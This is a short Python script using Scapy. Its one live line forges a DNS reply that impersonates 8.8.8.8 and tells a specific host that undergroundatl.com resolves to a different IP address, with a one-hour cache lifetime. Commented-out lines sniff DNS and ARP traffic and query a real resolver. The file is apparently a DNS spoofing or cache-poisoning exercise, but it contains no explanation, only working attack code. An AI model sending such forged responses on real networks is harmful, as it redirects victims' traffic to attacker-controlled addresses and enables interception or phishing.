import scapy.all as sc



# a = sc.sniff(timeout=60, filter="port 53", store=0)
# print(a)


# ans = sc.sr1(sc.IP(dst="8.8.8.8")/sc.UDP(sport=sc.RandShort(), dport=53)/sc.DNS(rd=1,qd=sc.DNSQR(qname="undergroundatl.com",qtype="A")))

# print(ans.an[0].rdata)
# print("\n")
# print(ans.command())

sc.send(sc.IP(version=4, ihl=5, tos=0, len=80, id=53050, flags=0, frag=0, ttl=117, proto=17,
              src='8.8.8.8', dst='131.155.246.66')/sc.UDP(sport=53, dport=17431,
            len=60)/sc.DNS(id=0, qr=1, opcode=0, aa=0, tc=0, rd=1, ra=1, z=0, ad=0, cd=0,
            rcode=0, qdcount=1, ancount=1, nscount=0, arcount=0, qd=[sc.DNSQR(qname=b'undergroundatl.com.',
            qtype=1, unicastresponse=0, qclass=1)], an=[sc.DNSRR(rrname=b'undergroundatl.com.', type=1,
                cacheflush=0, rclass=1, ttl=3600, rdata='131.155.244.43')]))




# while True: 
#     pkt = sc.sniff(count=1, filter="arp")
#     print(pkt)